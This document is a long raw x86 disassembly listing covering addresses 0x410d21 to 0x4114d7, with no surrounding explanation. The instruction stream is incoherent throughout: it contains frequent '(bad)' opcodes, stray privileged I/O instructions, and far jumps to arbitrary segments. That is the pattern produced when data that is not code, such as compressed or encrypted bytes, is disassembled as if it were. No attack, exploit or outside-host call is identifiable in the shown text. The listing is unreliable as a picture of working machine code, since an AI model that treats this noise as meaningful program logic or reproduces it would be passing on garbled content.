  410d21:	inc    esp
  410d22:	and    eax,edi
  410d24:	or     cl,BYTE PTR [ebx]
  410d26:	sub    eax,DWORD PTR [eax+ecx*1+0x20dc3fd2]
  410d2d:	sbb    dl,BYTE PTR ds:0x433a15ff
  410d33:	xchg   ebx,eax
  410d34:	push   0xe86e6ec2
  410d39:	mov    esp,0x8701f187
  410d3e:	inc    esi
  410d3f:	jbe    0x410cca
  410d41:	ss and al,0xa2
  410d44:	(bad)  
  410d46:	jmp    0x410d6e
  410d48:	pop    ebx
  410d49:	inc    edx
  410d4a:	sar    DWORD PTR [edi-0x49],0xb5
  410d4e:	jmp    0x410ce6
  410d50:	or     al,0x66
  410d52:	in     al,0x2b
  410d54:	adc    ebp,DWORD PTR [ecx]
  410d56:	sub    al,0x30
  410d58:	mov    ebx,DWORD PTR [edx+0x3636f2da]
  410d5e:	xlat   BYTE PTR ds:[ebx]
  410d5f:	clc    
  410d60:	dec    ebx
  410d61:	inc    esi
  410d62:	mov    ebp,0xe2d88ed5
  410d67:	mov    ebp,0x1ddf9775
  410d6c:	dec    esp
  410d6d:	cmp    al,0x2c
  410d6f:	data16 cmp al,0x6c
  410d72:	mov    dh,0x90
  410d74:	pop    ebp
  410d75:	bound  esi,QWORD PTR [edi]
  410d77:	sahf   
  410d78:	adc    ecx,0xffffffb5
  410d7b:	jmp    0x665d8dfb
  410d80:	nop
  410d81:	pop    ebx
  410d82:	dec    esp
  410d83:	shr    eax,cl
  410d85:	daa    
  410d86:	lock pop esi
  410d88:	or     DWORD PTR [eax+0x50],ecx
  410d8b:	(bad)  
  410d8c:	icebp  
  410d8d:	sbb    ch,bh
  410d8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d91:	cdq    
  410d92:	and    bh,bh
  410d94:	and    al,0x37
  410d96:	add    bl,BYTE PTR [ebx+0x13]
  410d99:	adc    BYTE PTR [eax+0x1d6414ca],bl
  410d9f:	imul   ebx,DWORD PTR [ecx-0x13],0xa1436375
  410da6:	mov    bl,0x9
  410da8:	push   ss
  410da9:	pushf  
  410daa:	daa    
  410dab:	test   bh,bl
  410dad:	dec    ecx
  410dae:	xor    DWORD PTR [eax-0x16c84c74],ebx
  410db4:	inc    esp
  410db5:	nop
  410db6:	imul   eax,esp,0x4ca91c6a
  410dbc:	sbb    ebx,DWORD PTR [ebp-0x6a4483aa]
  410dc2:	ins    BYTE PTR es:[edi],dx
  410dc3:	adc    cl,BYTE PTR [eax-0x3a]
  410dc6:	jge    0x410e1f
  410dc8:	xchg   edx,eax
  410dc9:	or     edx,0xffffff9b
  410dcc:	push   ebp
  410dcd:	or     eax,0x2388d893
  410dd2:	jns    0x410e08
  410dd4:	fcomp  DWORD PTR [ecx-0x4e]
  410dd7:	jge    0x410dc4
  410dd9:	jle    0x410d74
  410ddb:	pushf  
  410ddc:	adc    esp,0xffffffe3
  410ddf:	mov    bl,0x34
  410de1:	leave  
  410de2:	xchg   ecx,eax
  410de3:	enter  0x8bb,0x87
  410de7:	add    dh,cl
  410de9:	(bad)  [esp+esi*4-0x4a]
  410ded:	xchg   edx,eax
  410dee:	in     eax,dx
  410def:	cmc    
  410df0:	sub    eax,0xa0470263
  410df5:	jmp    0x410d86
  410df7:	xor    DWORD PTR [edx],edx
  410df9:	inc    ebx
  410dfa:	xor    al,0xf2
  410dfc:	cmc    
  410dfd:	and    bh,al
  410dff:	js     0x410de2
  410e01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e02:	add    ecx,DWORD PTR [edi+edx*2+0x70]
  410e06:	add    DWORD PTR [edx+0x5b006da8],edi
  410e0c:	fs adc al,0xee
  410e0f:	(bad)  
  410e10:	int    0xf6
  410e12:	xchg   edi,eax
  410e13:	xchg   esi,eax
  410e14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e15:	mov    bh,0xb4
  410e17:	mov    dl,0xac
  410e19:	aaa    
  410e1a:	xchg   ecx,eax
  410e1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e1c:	xchg   edi,eax
  410e1d:	popf   
  410e1e:	mov    ah,0xd6
  410e20:	aaa    
  410e21:	rcl    BYTE PTR [esi+0x22dce29],0x48
  410e28:	ja     0x410e08
  410e2a:	mov    WORD PTR [eax+0x3],?
  410e2d:	xor    eax,0x2bd8ee5
  410e32:	aam    0x4f
  410e34:	jo     0x410e23
  410e36:	add    ebp,ebp
  410e38:	pop    ebx
  410e39:	shl    DWORD PTR [esi],cl
  410e3b:	adc    DWORD PTR [esi],edx
  410e3d:	pushf  
  410e3e:	xor    eax,0x5d55a916
  410e43:	add    eax,0x843601b5
  410e48:	repnz push esi
  410e4a:	jmp    0x2a20:0xe97ef70
  410e51:	mov    esp,0x709cdf6a
  410e56:	cmp    DWORD PTR [eax+0x382e65fb],ecx
  410e5c:	pop    ebp
  410e5d:	ret    
  410e5e:	out    dx,al
  410e5f:	mov    dl,BYTE PTR [esi+0x44]
  410e62:	cmp    ah,BYTE PTR [ebp-0x3a73a350]
  410e68:	mov    bh,0x68
  410e6a:	or     al,0x1d
  410e6c:	mov    bl,0xec
  410e6e:	int    0x53
  410e70:	sub    ecx,edi
  410e72:	jp     0x410e08
  410e74:	xchg   BYTE PTR [edx-0xd7ea847],cl
  410e7a:	and    dl,BYTE PTR [eax-0x3562973b]
  410e80:	test   al,0x60
  410e82:	fcomp  QWORD PTR [edi-0x62]
  410e85:	add    bl,ah
  410e87:	aaa    
  410e88:	jecxz  0x410eae
  410e8a:	pop    ss
  410e8b:	mov    ah,bh
  410e8d:	adc    BYTE PTR [eax],0xe3
  410e90:	nop
  410e91:	xor    eax,0x9d7d867b
  410e96:	les    ecx,FWORD PTR [eax]
  410e98:	xchg   edx,eax
  410e99:	pop    ds
  410e9a:	test   al,0x93
  410e9c:	mov    ebp,0xb3caa2dc
  410ea1:	inc    BYTE PTR [eax]
  410ea3:	jmp    0x410e41
  410ea5:	jo     0x410f06
  410ea7:	dec    esi
  410ea8:	pop    esp
  410ea9:	mov    ds:0x11b5a423,al
  410eae:	loope  0x410f25
  410eb0:	xor    bl,dh
  410eb2:	or     ah,BYTE PTR [ebx+eiz*1+0x36]
  410eb6:	icebp  
  410eb7:	add    BYTE PTR ds:0x5fdc01ea,ch
  410ebd:	(bad)  
  410ebe:	fnstenv [eax]
  410ec0:	in     eax,0xb0
  410ec2:	cld    
  410ec3:	arpl   WORD PTR [eax-0x14],cx
  410ec6:	xor    DWORD PTR [edi],esi
  410ec8:	inc    edi
  410ec9:	jge    0x410eda
  410ecb:	sti    
  410ecc:	adc    edx,ebx
  410ece:	dec    eax
  410ecf:	add    al,0xc7
  410ed1:	ret    
  410ed2:	cmp    ecx,DWORD PTR [esi+0x71a71984]
  410ed8:	and    ah,bh
  410eda:	adc    edx,DWORD PTR [edx-0x4902233a]
  410ee0:	jmp    0xabbc:0xbbb2f1a1
  410ee7:	jae    0x410e84
  410ee9:	xlat   BYTE PTR ds:[ebx]
  410eea:	or     eax,0xbeaf7496
  410eef:	fwait
  410ef0:	jbe    0x410ec1
  410ef2:	sbb    eax,0x194647f2
  410ef7:	lods   al,BYTE PTR ds:[esi]
  410ef8:	inc    ebx
  410ef9:	push   esi
  410efa:	and    DWORD PTR [ebx],0x787ac880
  410f00:	mov    gs,ebx
  410f02:	xor    edx,DWORD PTR [ecx-0xf13e0f1]
  410f08:	ret    
  410f09:	jmp    0xf2bc:0x1ea1a3f6
  410f10:	data16 add BYTE PTR [ebx+0x7a618806],bl
  410f17:	xor    BYTE PTR [eax],0xf8
  410f1a:	jge    0x410f0d
  410f1c:	adc    ebp,0x4978cf14
  410f22:	adc    eax,0x8af5147b
  410f27:	les    edx,FWORD PTR [ebx]
  410f29:	push   ebx
  410f2a:	pushf  
  410f2b:	icebp  
  410f2c:	push   ds
  410f2d:	xchg   BYTE PTR [ecx+edi*4+0x52],ah
  410f31:	mov    cl,0xc3
  410f33:	(bad)  
  410f34:	addr16 nop
  410f36:	lock lods al,BYTE PTR ds:[esi]
  410f38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f39:	inc    esi
  410f3a:	jb     0x410eff
  410f3c:	lods   al,BYTE PTR ds:[esi]
  410f3d:	or     eax,0x5d7265c5
  410f42:	and    eax,0x31d04613
  410f47:	jmp    0x4c6e9c5f
  410f4c:	mov    esi,0x24a30efd
  410f51:	hlt    
  410f52:	icebp  
  410f53:	mov    ebp,0x7bbd315
  410f59:	and    esi,DWORD PTR [eax-0x4b257566]
  410f5f:	scas   al,BYTE PTR es:[edi]
  410f60:	sub    DWORD PTR [edi],0xfffffff5
  410f63:	outs   dx,BYTE PTR ds:[esi]
  410f64:	xchg   ecx,eax
  410f65:	mov    DWORD PTR [ecx-0x6f],ecx
  410f68:	mov    esp,0x84fdfc5
  410f6d:	aaa    
  410f6e:	daa    
  410f6f:	(bad)  
  410f70:	into   
  410f71:	arpl   bp,bp
  410f73:	ins    DWORD PTR es:[edi],dx
  410f74:	in     al,dx
  410f75:	inc    esi
  410f76:	pop    esp
  410f77:	adc    al,0x56
  410f79:	in     al,0xd5
  410f7b:	rol    esi,0x78
  410f7e:	sbb    esp,DWORD PTR [ebp-0x6113e4bd]
  410f84:	and    ch,BYTE PTR [edi]
  410f86:	or     eax,0x3f93d19a
  410f8b:	in     eax,0xc4
  410f8d:	idiv   BYTE PTR [esi]
  410f8f:	add    eax,0x155121da
  410f94:	call   FWORD PTR [edx-0x20bba91]
  410f9a:	pop    edx
  410f9b:	inc    eax
  410f9c:	add    BYTE PTR [edi+0x75],bh
  410f9f:	add    BYTE PTR [ebx-0x7fb3b9f6],cl
  410fa5:	gs sub ah,ah
  410fa8:	xchg   esp,eax
  410fa9:	and    BYTE PTR [esi-0x31],bh
  410fac:	cmp    cl,BYTE PTR [ebp-0x55eac22d]
  410fb2:	popf   
  410fb3:	jl     0x41100e
  410fb5:	lock ret 0x4871
  410fb9:	mov    ebx,0x7d743143
  410fbe:	(bad)  
  410fbf:	test   al,0x17
  410fc1:	test   DWORD PTR cs:[eax+0xf],ebx
  410fc5:	xchg   edi,eax
  410fc6:	(bad)  
  410fc7:	adc    al,0xe8
  410fc9:	or     esp,esi
  410fcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fcc:	dec    esp
  410fcd:	out    dx,al
  410fce:	push   ds
  410fcf:	call   0x202eb78a
  410fd4:	pop    edx
  410fd5:	neg    BYTE PTR [ecx+ebx*1-0x14]
  410fd9:	add    ebx,DWORD PTR [edx+0x67]
  410fdc:	push   esi
  410fdd:	dec    ebx
  410fde:	ds pop ecx
  410fe0:	inc    ebp
  410fe1:	popf   
  410fe2:	jmp    0x410f66
  410fe4:	pop    edx
  410fe5:	jg     0x410fc7
  410fe7:	pop    esi
  410fe8:	pop    es
  410fe9:	movq   QWORD PTR [ebp-0x2f],mm4
  410fed:	fs dec esi
  410fef:	je     0x41104e
  410ff1:	jge    0x410fb2
  410ff3:	icebp  
  410ff4:	dec    ecx
  410ff5:	cli    
  410ff6:	stc    
  410ff7:	mov    dh,ch
  410ff9:	or     DWORD PTR [ebp-0x4f],0x1a
  410ffd:	mov    bh,0x90
  410fff:	mov    edi,0x6370f8fd
  411004:	out    dx,al
  411005:	mov    ds:0xb69a8fcd,eax
  41100a:	loope  0x410fc7
  41100c:	hlt    
  41100d:	xor    al,0x8
  41100f:	pop    ebp
  411010:	or     BYTE PTR ds:0x7309d9a7,cl
  411016:	inc    edi
  411017:	mov    DWORD PTR [ebp+0x72a26c78],edi
  41101d:	jecxz  0x410fbb
  41101f:	aas    
  411020:	push   0xa43b798a
  411025:	(bad)  
  411026:	jnp    0x410fd6
  411028:	ins    BYTE PTR es:[edi],dx
  411029:	mov    ah,0xa8
  41102b:	shr    BYTE PTR [edx-0x2e],0xa
  41102f:	dec    edi
  411030:	retf   0xa5cd
  411033:	adc    al,bl
  411035:	cmc    
  411036:	pop    eax
  411037:	sub    edi,DWORD PTR [ebp+0x7173ad23]
  41103d:	xor    bh,BYTE PTR [edi+0x310dcf1]
  411043:	sbb    BYTE PTR [ebx-0x1f],ch
  411046:	ins    BYTE PTR es:[edi],dx
  411047:	or     edx,esi
  411049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41104a:	adc    al,0x33
  41104c:	dec    eax
  41104d:	dec    ebp
  41104e:	cmp    eax,0xee90350c
  411053:	hlt    
  411054:	sub    DWORD PTR [ebp-0x14e8200b],0xffffffff
  41105b:	mov    ds:0x5a9b4011,al
  411060:	cvtps2pd xmm6,xmm4
  411063:	jecxz  0x411074
  411065:	cs mov edx,0x39714f3d
  41106b:	mov    ebp,0x6fee8646
  411070:	stos   DWORD PTR es:[edi],eax
  411071:	sub    BYTE PTR [edi],0xf3
  411074:	mov    al,0xb0
  411076:	cmp    DWORD PTR [ebx],ecx
  411078:	in     eax,dx
  411079:	adc    BYTE PTR [esi-0x4daa77ca],0x15
  411080:	jg     0x41104d
  411082:	loopne 0x411089
  411084:	js     0x41101c
  411086:	shl    BYTE PTR [ebp+0x2a031aef],0xc7
  41108d:	dec    ebp
  41108e:	mov    cx,WORD PTR [ebp+0x484529ce]
  411095:	fld    st(5)
  411097:	pop    ecx
  411098:	arpl   WORD PTR [eax-0x28],bx
  41109b:	aaa    
  41109c:	jae    0x4110e9
  41109e:	inc    ebp
  41109f:	(bad)  
  4110a0:	or     DWORD PTR [edx],ebx
  4110a2:	out    0x37,al
  4110a4:	lods   eax,DWORD PTR ds:[esi]
  4110a5:	sbb    ch,BYTE PTR [edx+0x7b170d82]
  4110ab:	and    DWORD PTR ds:[esi],eax
  4110ae:	xchg   ebp,eax
  4110af:	pop    eax
  4110b0:	pusha  
  4110b1:	aas    
  4110b2:	sbb    esi,DWORD PTR [esp+edx*2-0x675e2f95]
  4110b9:	retf   
  4110ba:	inc    edx
  4110bb:	dec    edi
  4110bc:	mov    gs,WORD PTR [eax]
  4110be:	scas   eax,DWORD PTR es:[edi]
  4110bf:	fs push ds
  4110c1:	jecxz  0x4110ce
  4110c3:	repnz inc edi
  4110c5:	(bad)  
  4110c6:	in     al,0x16
  4110c8:	fwait
  4110c9:	std    
  4110ca:	outs   dx,DWORD PTR ds:[esi]
  4110cb:	jle    0x41106d
  4110cd:	xor    bl,BYTE PTR [ebp+0x77904d6a]
  4110d3:	fadd   st(4),st
  4110d5:	jmp    0x2e53ea40
  4110da:	cmp    al,0xdc
  4110dc:	add    bh,ch
  4110de:	in     eax,dx
  4110df:	push   0x4b3d4c79
  4110e4:	ins    DWORD PTR es:[edi],dx
  4110e5:	fidiv  WORD PTR [ebp+0x7d755d74]
  4110eb:	jle    0x41110c
  4110ed:	jg     0x411164
  4110ef:	adc    al,0x87
  4110f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110f2:	je     0x4110d9
  4110f4:	pop    ebp
  4110f5:	mov    esp,0x4f886ad3
  4110fa:	pushf  
  4110fb:	push   es
  4110fc:	jmp    0x4110a3
  4110fe:	out    0x75,eax
  411100:	xchg   edi,eax
  411101:	in     eax,0x46
  411103:	shr    ebx,0x43
  411106:	jmp    0x9c63:0xc28dad02
  41110d:	es add al,0xce
  411110:	pushf  
  411111:	mov    al,al
  411113:	cdq    
  411114:	test   eax,0x8cbf19d1
  411119:	sub    bl,BYTE PTR [esi]
  41111b:	jae    0x4110e1
  41111d:	bound  ecx,QWORD PTR [ebx]
  41111f:	add    esp,ebx
  411121:	cs sahf 
  411123:	dec    ecx
  411124:	(bad)  
  411126:	ins    DWORD PTR es:[edi],dx
  411127:	outs   dx,BYTE PTR ds:[esi]
  411128:	cmp    WORD PTR [edi-0x32],bp
  41112c:	mov    ebx,0x4ae2a2eb
  411131:	and    BYTE PTR [ebx-0x199b565d],bl
  411137:	jmp    0xc67f:0xb4724ecb
  41113e:	sub    al,0xf0
  411140:	out    0xc1,eax
  411142:	fdiv   QWORD PTR [ebp-0x2d]
  411145:	jl     0x411141
  411147:	fcomp  DWORD PTR [ebx]
  411149:	fcomi  st,st(5)
  41114b:	cmp    DWORD PTR [edi],esi
  41114d:	out    0xf1,al
  41114f:	ficom  DWORD PTR [eax+0x7cbc21b7]
  411155:	iret   
  411156:	mov    ds:0xd0980f62,al
  41115b:	cwde   
  41115c:	add    BYTE PTR [edx+0x22],al
  41115f:	jge    0x411161
  411161:	jecxz  0x411113
  411163:	cmp    esp,0xd
  411166:	repz pop ebp
  411168:	inc    edx
  411169:	mov    DWORD PTR [edi+0x15],0xfa8cb765
  411170:	jmp    0x306c:0x7261a2cc
  411177:	scas   al,BYTE PTR es:[edi]
  411178:	push   edx
  411179:	push   esi
  41117a:	or     al,0x2e
  41117c:	or     ch,ah
  41117e:	test   DWORD PTR [ebx-0xf4604d],0x26d84474
  411188:	xor    DWORD PTR [eax],edi
  41118a:	push   ecx
  41118b:	sub    eax,0x1af57d18
  411190:	icebp  
  411191:	shr    DWORD PTR [edx+0x3f],0x1
  411195:	int    0x97
  411197:	(bad)  
  411198:	stos   DWORD PTR es:[edi],eax
  411199:	pop    ebp
  41119a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41119b:	mov    BYTE PTR ds:0xc351d124,dh
  4111a1:	cmp    dh,BYTE PTR [esi]
  4111a3:	test   eax,0xa2cf9c8
  4111a8:	xor    eax,0x3d646a26
  4111ad:	inc    edx
  4111ae:	push   ds
  4111af:	aam    0x6c
  4111b1:	fcomip st,st(7)
  4111b3:	push   es
  4111b4:	and    al,0xba
  4111b6:	retf   0x9bb2
  4111b9:	or     al,0xa5
  4111bb:	bound  edi,QWORD PTR ds:0xff4020f9
  4111c1:	in     eax,0xfd
  4111c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111c4:	adc    cl,BYTE PTR [ecx+eiz*2]
  4111c7:	or     DWORD PTR [ebx-0x17148ec0],edx
  4111cd:	lds    ebp,FWORD PTR [eax-0x575aa99a]
  4111d3:	adc    BYTE PTR [edi+0x75],0x35
  4111d7:	aas    
  4111d8:	or     eax,0x1c5c98dd
  4111dd:	mov    ebx,eax
  4111df:	outs   dx,BYTE PTR ds:[esi]
  4111e0:	lds    esi,FWORD PTR [ebp-0x2d4c8f56]
  4111e6:	(bad)  
  4111e8:	cmp    ecx,esp
  4111ea:	icebp  
  4111eb:	rcr    BYTE PTR [eax],cl
  4111ed:	mov    bh,ah
  4111ef:	cmp    dh,BYTE PTR [ebx]
  4111f1:	dec    ecx
  4111f2:	repnz mov ecx,0xca3d9c53
  4111f8:	pusha  
  4111f9:	cld    
  4111fa:	add    DWORD PTR [eax+0x2e],esp
  4111fd:	cld    
  4111fe:	inc    ebx
  4111ff:	fucomi st,st(7)
  411201:	mov    DWORD PTR [ecx+0x3f],esi
  411204:	test   BYTE PTR [edx+0x3186630d],cl
  41120a:	add    ecx,DWORD PTR [esp+ebx*2-0x42]
  41120e:	adc    BYTE PTR [esi+0x1bfa2be6],bl
  411214:	push   ecx
  411215:	add    esi,eax
  411217:	pop    esp
  411218:	pop    ebx
  411219:	scas   al,BYTE PTR es:[edi]
  41121a:	add    edx,DWORD PTR [eax-0x7e073d0f]
  411220:	push   ebp
  411221:	pop    edx
  411222:	test   eax,0x45d02dfc
  411227:	pop    ds
  411228:	enter  0x805,0xaa
  41122c:	add    BYTE PTR [edx-0x647f59b1],ah
  411232:	mov    bl,0x4
  411234:	jno    0x411295
  411236:	add    al,ah
  411238:	pop    esi
  411239:	inc    ecx
  41123a:	jne    0x41125b
  41123c:	out    0x82,eax
  41123e:	xlat   BYTE PTR ds:[ebx]
  41123f:	xor    BYTE PTR [edi-0x42],dl
  411242:	xchg   DWORD PTR [eax+eax*4-0x4d321b0],edx
  411249:	ret    
  41124a:	sbb    eax,0x65402dbf
  41124f:	mov    edx,0x6f3a911
  411254:	sub    DWORD PTR [esi+0x3b5610d9],eax
  41125a:	inc    ebx
  41125b:	scas   al,BYTE PTR es:[edi]
  41125c:	scas   al,BYTE PTR es:[edi]
  41125d:	pop    edx
  41125e:	and    eax,0x9b11e158
  411263:	call   0x13919ea5
  411268:	mov    bh,0x90
  41126a:	mov    bh,BYTE PTR [ebx]
  41126c:	push   es
  41126d:	push   ecx
  41126e:	icebp  
  41126f:	mov    cl,0x56
  411271:	clc    
  411272:	mov    esi,0x6d623f8e
  411277:	xchg   ebx,eax
  411278:	pusha  
  411279:	aaa    
  41127a:	icebp  
  41127b:	pop    edx
  41127c:	sti    
  41127d:	loop   0x41122a
  41127f:	ds repnz fs inc edx
  411283:	ret    
  411284:	sub    DWORD PTR [edi-0x19201f83],0xffffffca
  41128b:	stos   BYTE PTR es:[edi],al
  41128c:	jl     0x411262
  41128e:	pusha  
  41128f:	leave  
  411290:	jmp    DWORD PTR [esi]
  411292:	or     eax,0xb7b9c142
  411297:	clc    
  411298:	(bad)  
  411299:	fwait
  41129a:	or     edi,0x6d0e3726
  4112a0:	les    ecx,FWORD PTR [ebx-0x60]
  4112a3:	shl    BYTE PTR [esi+0x3e2bb244],0x40
  4112aa:	and    al,0x8c
  4112ac:	mov    edi,0xd285900c
  4112b1:	mov    ah,0xf0
  4112b3:	jo     0x41128b
  4112b5:	mov    ah,0xb7
  4112b7:	fidivr WORD PTR [eax]
  4112b9:	sbb    eax,DWORD PTR [edx]
  4112bb:	xor    BYTE PTR [edx+ebx*1-0xbe0b89f],0x63
  4112c3:	call   0x480cfeab
  4112c8:	sub    al,0x4b
  4112ca:	mov    edi,0x82bd84f
  4112cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112d0:	test   al,0x89
  4112d2:	mov    dh,0x9f
  4112d4:	pop    ecx
  4112d5:	(bad)  
  4112d6:	pop    ds
  4112d7:	or     DWORD PTR es:[edi-0x7b845e38],ebp
  4112de:	stos   DWORD PTR es:[edi],eax
  4112df:	out    dx,eax
  4112e0:	fstp   QWORD PTR [ebx+0x78]
  4112e3:	pop    esp
  4112e4:	out    dx,eax
  4112e5:	in     al,dx
  4112e6:	sub    DWORD PTR [eax+0x42],eax
  4112e9:	cmp    DWORD PTR [ebp+0x7],eax
  4112ec:	neg    BYTE PTR [ecx]
  4112ee:	mov    edx,0xfcfd5cc2
  4112f3:	push   0x5c4b5606
  4112f8:	mov    bl,0x6c
  4112fa:	or     DWORD PTR [esi+0x7],0x37
  4112fe:	push   es
  4112ff:	test   BYTE PTR [edx-0x30],ch
  411302:	(bad)  
  411303:	sub    ecx,edx
  411305:	fisub  DWORD PTR [ebx]
  411307:	jge    0x4112e6
  411309:	ss push ss
  41130b:	popa   
  41130c:	mov    dl,0x31
  41130e:	cdq    
  41130f:	mov    eax,?
  411311:	push   edi
  411312:	or     dh,BYTE PTR [ebx+0x5f45c0be]
  411318:	jbe    0x411326
  41131a:	mov    dh,ah
  41131c:	rcr    BYTE PTR [ebp-0xf8f4ab7],0xc0
  411323:	ret    0xa05a
  411326:	lods   eax,DWORD PTR ds:[esi]
  411327:	pop    edi
  411328:	dec    edi
  411329:	popa   
  41132a:	jg     0x4112de
  41132c:	or     eax,0x6878cdb1
  411331:	adc    al,BYTE PTR [edi+eiz*8+0x61]
  411335:	mov    esp,0x91cc6634
  41133a:	not    DWORD PTR [edi]
  41133c:	repz and al,dl
  41133f:	xchg   esi,eax
  411340:	pop    ds
  411341:	push   esp
  411342:	adc    DWORD PTR [esi-0x5a],esp
  411345:	in     eax,dx
  411346:	dec    ebp
  411347:	ficom  DWORD PTR [eax-0x343b0ed2]
  41134d:	mov    al,0xf6
  41134f:	out    0x96,eax
  411351:	aam    0xeb
  411353:	pop    ss
  411354:	lock nop
  411356:	adc    al,0x36
  411358:	inc    ecx
  411359:	(bad)  
  41135a:	out    dx,eax
  41135b:	sub    al,0x7a
  41135d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41135e:	cmp    edi,DWORD PTR [edi+0x1642a290]
  411364:	inc    eax
  411365:	(bad)  
  411366:	rcl    BYTE PTR [edx],0xd
  411369:	ficomp DWORD PTR [ebp+0x49]
  41136c:	sub    eax,0xd6cfb3a1
  411371:	mov    eax,ds:0xebe3b311
  411376:	mov    esi,0xcc28b6b8
  41137b:	cmp    DWORD PTR [ebp-0x49],esp
  41137e:	lock mov dh,0x27
  411381:	xchg   ebp,eax
  411382:	ret    0xbf98
  411385:	add    al,0xae
  411387:	dec    esi
  411388:	xlat   BYTE PTR ds:[ebx]
  411389:	jmp    0x2833eb25
  41138e:	inc    edx
  41138f:	inc    esi
  411390:	mov    bh,0x46
  411392:	les    esp,FWORD PTR [edi]
  411394:	mov    ebp,0x7fd909b3
  411399:	dec    edi
  41139a:	push   edi
  41139b:	call   0x46fa:0x898cbbe1
  4113a2:	fsubr  QWORD PTR [ebx-0x5]
  4113a5:	or     edi,DWORD PTR [esp+edi*2]
  4113a8:	push   ebx
  4113a9:	in     al,0x48
  4113ab:	mov    ah,0x6f
  4113ad:	sbb    edx,edi
  4113af:	aaa    
  4113b0:	mov    BYTE PTR [ebx+edx*8-0x5e],al
  4113b4:	mov    ebp,0x525ee870
  4113b9:	rol    BYTE PTR [ebx+esi*8-0x43],1
  4113bd:	push   cs
  4113be:	aaa    
  4113bf:	pop    edi
  4113c0:	outs   dx,DWORD PTR ds:[esi]
  4113c1:	cli    
  4113c2:	and    edx,DWORD PTR [eax-0x75113c9e]
  4113c8:	scas   al,BYTE PTR es:[edi]
  4113c9:	aad    0x86
  4113cb:	push   ebp
  4113cc:	in     eax,dx
  4113cd:	std    
  4113ce:	(bad)
  4113d1:	ret    
  4113d2:	push   edx
  4113d3:	mov    al,ds:0xe87055b1
  4113d8:	sub    bl,BYTE PTR [edx-0x9]
  4113db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113dc:	push   0xf87fe230
  4113e1:	sub    dl,BYTE PTR [ebx+esi*8+0x7]
  4113e5:	sahf   
  4113e6:	shl    ch,1
  4113e8:	div    BYTE PTR ds:[eax+0x3ef0aee8]
  4113ef:	pushf  
  4113f0:	sbb    DWORD PTR [eax],esi
  4113f2:	and    al,0x40
  4113f4:	ins    BYTE PTR es:[edi],dx
  4113f5:	jg     0x4113db
  4113f7:	aas    
  4113f8:	fwait
  4113f9:	sahf   
  4113fa:	outs   dx,DWORD PTR ds:[esi]
  4113fb:	mov    bh,0xd
  4113fd:	(bad)  
  4113fe:	jns    0x4113c1
  411400:	pop    ebp
  411401:	xor    DWORD PTR [esi+0x46],ecx
  411404:	or     eax,DWORD PTR [edx+0x6f400ae3]
  41140a:	retf   0x44ad
  41140d:	inc    ecx
  41140e:	add    edi,esi
  411410:	or     esi,0x7f
  411413:	(bad)  
  411414:	popa   
  411415:	stos   BYTE PTR es:[edi],al
  411416:	cld    
  411417:	(bad)  
  411418:	repz std 
  41141a:	fiadd  DWORD PTR [ebp-0x79]
  41141d:	mov    bh,0x83
  41141f:	sti    
  411420:	mov    ah,BYTE PTR [edx-0x28]
  411423:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411424:	jmp    0x4113c7
  411426:	and    eax,0x227f0434
  41142b:	cmp    ecx,DWORD PTR [edi-0x11]
  41142e:	(bad)  
  41142f:	pop    eax
  411430:	sahf   
  411431:	imul   esp,DWORD PTR [edi],0x3d
  411434:	add    eax,DWORD PTR [esi]
  411436:	xchg   ecx,eax
  411437:	pop    edi
  411438:	mov    al,ds:0xf8a2c10
  41143d:	test   eax,0x2997a2a5
  411442:	push   eax
  411443:	sbb    DWORD PTR [edi+0x42],0x617706db
  41144a:	leave  
  41144b:	test   eax,0x4d51e3c9
  411450:	jne    0x4113e9
  411452:	fsubr  QWORD PTR [eax+0x8b8eeda]
  411458:	cmc    
  411459:	iret   
  41145a:	ins    BYTE PTR es:[edi],dx
  41145b:	xor    DWORD PTR [eax-0x5a],ecx
  41145e:	cs dec ebx
  411460:	add    al,0x7d
  411462:	bsf    ecx,DWORD PTR [ecx+0x61]
  411466:	inc    ebx
  411467:	ret    0x7012
  41146a:	sub    eax,0x6636ca54
  41146f:	mov    al,0x0
  411471:	and    edi,DWORD PTR [eax]
  411473:	add    al,0x4f
  411475:	pushf  
  411476:	xchg   esi,ebp
  411478:	inc    edx
  411479:	inc    eax
  41147a:	pop    ebx
  41147b:	sub    ecx,DWORD PTR [ecx]
  41147d:	pop    edx
  41147e:	fsub   QWORD PTR [esi]
  411480:	aad    0xa1
  411482:	cmc    
  411483:	in     eax,dx
  411484:	adc    bh,BYTE PTR [eax-0x3efac0c0]
  41148a:	pop    es
  41148b:	mov    al,0xf3
  41148d:	and    DWORD PTR [edx],edi
  41148f:	iret   
  411490:	jo     0x4114a9
  411492:	xor    esi,edx
  411494:	jae    0x41144f
  411496:	jo     0x41149e
  411498:	push   ebx
  411499:	pop    esi
  41149a:	loopne 0x411427
  41149c:	jl     0x411513
  41149e:	aad    0x67
  4114a0:	push   0xffffffb5
  4114a2:	cld    
  4114a3:	mov    DWORD PTR [edx],edx
  4114a5:	cli    
  4114a6:	add    DWORD PTR ds:0x8e4f5730,eax
  4114ac:	pop    esp
  4114ad:	test   BYTE PTR [ecx+0x402e4e50],cl
  4114b3:	push   ds
  4114b4:	inc    ebx
  4114b5:	or     al,0xa3
  4114b7:	cs ret 0x6356
  4114bb:	mov    ecx,0xbc3788dc
  4114c0:	adc    eax,0xf51f2186
  4114c5:	bound  ebx,QWORD PTR [ecx]
  4114c7:	sbb    eax,0x819b2646
  4114cc:	mov    edx,DWORD PTR [edx+0x60e02329]
  4114d2:	rcr    BYTE PTR [esi+0x4a],1
  4114d5:	push   ebx
  4114d6:	xchg   edx,eax
  4114d7:	mov    esp,0x56abf5fc
